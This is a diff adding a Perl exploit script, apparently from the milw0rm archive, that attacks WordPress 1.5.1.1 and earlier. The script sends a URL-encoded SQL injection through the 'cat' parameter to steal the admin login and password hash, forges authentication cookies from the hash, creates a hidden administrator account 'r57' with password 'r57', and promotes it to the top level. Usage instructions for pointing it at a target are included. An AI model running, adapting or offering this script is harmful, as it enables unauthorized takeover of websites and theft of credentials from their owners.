@@ -1,0 +1,112 @@
+#!/usr/bin/perl
+
+## WordPress <= 1.5.1.1 sql injection "add new admin" exploit
+## by RST/GHC , http://rst.void.ru , http://ghc.ru
+## coded by 1dt.w0lf
+
+use LWP::UserAgent;
+use Getopt::Std;
+use HTTP::Cookies;
+use Digest::MD5 qw(md5_hex);
+getopts('h:p:');
+
+$path = $opt_h;
+$pref = $opt_p || 'wp_';
+
+if(!$path) { usage(); }
+
+$xpl = LWP::UserAgent->new() or die;
+&header();
+print " +---[x] STEP 1 - TRY GET ADMIN INFO\n";
+$reg  = $path;
+$reg .= '?%63%61%74=%36%36%36%20%75%6E%69%6F%6E%20%73%65%6C%65%63%74%20%36%36%36%2C%63%6F%6E'.
+        '%63%61%74%28%63%68%61%72%28%35%38%2C%35%38%2C%35%38%29%2C%75%73%65%72%5F%6C%6F%67%69'.
+        '%6E%2C%63%68%61%72%28%35%38%2C%35%38%2C%35%38%29%2C%75%73%65%72%5F%70%61%73%73%2C%63'.
+        '%68%61%72%28%35%38%2C%35%38%2C%35%38%29%29%2C%6E%75%6C%6C%2C%6E%75%6C%6C%2C%6E%75%6C'.
+        '%6C%20%66%72%6F%6D%20'.$pref.'%75%73%65%72%73%20%57%48%45%52%45%20%49%44=1'; ### 1 - admin ID
+$res = $xpl->get($reg);
+die "ERROR : ", $res->status_line unless $res->is_success;
+if($res->content =~ m/(?::::)(.*)(?::::)([a-f0-9]{32})(?::::)(<\/title>)/) 
+  { 
+  $login = $1; $hash = $2; 
+  print "\n>> LOGIN : $login\n>>  HASH : $hash\n\n";
+  }
+else { print "ERROR : Forum not vulnerable or bad prefix."; exit(); }
+
+$cookie_jar = HTTP::Cookies->new();
+($cpath = $path) =~ s!/$!!;
+$hash  = md5_hex($hash);
+($host   = $cpath) =~ s!http://([^/]*).*!$1!;
+$cpath = md5_hex($cpath);
+
+$xpl->cookie_jar( $cookie_jar );
+
+$cookie_jar->set_cookie( "0","wordpresspass_$cpath","$hash","/",$host,,,,,);
+$cookie_jar->set_cookie( "1","wordpressuser_$cpath","$login","/",$host,,,,,);
+print " +---[x] STEP 2 - CREATE NEW USER\n";
+$reg  = $path;
+$reg .= 'wp-admin/users.php';
+$res = $xpl->post("$reg",
+{
+ "action"     => "adduser",
+ "user_login" => "r57",
+ "firstname"  => "RST",
+ "lastname"   => "GHC",
+ "email"      => "billy\@microsoft.com",
+ "uri"        => "http://rst.void.ru",
+ "pass1"      => "r57",
+ "pass2"      => "r57",
+ "adduser"    => "Submit",
+},
+Referer => $reg
+);
+print " +---[x] STEP 3 - GET ID OF NEW USER\n";
+$reg  = $path;
+$reg .= 'wp-admin/users.php';
+$res = $xpl->get("$reg",Referer => $reg);
+@res = split(/\n/,$res->content);
+$id = 0;
+for(@res)
+ {
+  if(/(?:\<td align=\'center\'\>)([0-9]*)(?:\<\/td\>)/) { $id = $1; }
+  if(/\<td\>\<strong\>r57\<\/strong\>\<\/td\>/) { last; }
+ }
+die "ERROR : ", $res->status_line unless $res->is_success;
+if($id != 0) { print "\n>> ID : $id\n\n"; }
+else { print "[-] ERROR : CAN'T GET NEW USER ID\n"; exit(); }
+print " +---[x] STEP 4 - LEVEL UP FOR NEW USER\n\n";
+$reg  = $path;
+$reg .= 'wp-admin/users.php?action=promote&id='.$id.'&prom=up';
+for($i=0;$i<10;$i++)
+{
+print ">> LEVEL UP # $i\n";
+$res = $xpl->get("$reg",Referer => $reg);
+die "ERROR : ", $res->status_line unless $res->is_success;
+}
+print "\nTHATS ALL. NOW YOU CAN LOGIN WITH USERNAME 'r57' AND PASSWORD 'r57'\n";
+
+sub usage()
+{
+ &header();
+ print "USAGE : r57wp.pl [OPTIONS]\n";
+ print "\noptions:\n\n";
+ print "-h [path]\n";
+ print "	Path to wordpress installed\n";
+ print "-p [prefix] (optional)\n";
+ print "	Database tables prefix (default 'wp_')\n\n";
+ print "e.g.: r57wp.pl -h http://blah.com/wordpress/\n";
+ print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
+ print "(c)oded by 1dt.w0lf\n";
+ print "RST/GHC\n";
+ print "http://ghc.ru\n";
+ print "http://rst.void.ru\n";
+ exit();
+}
+sub header()
+{
+ print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
+ print "                 WordPress 1.5.1.1 exploit                 \n";
+ print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
+}
+
+# milw0rm.com [2005-06-21]
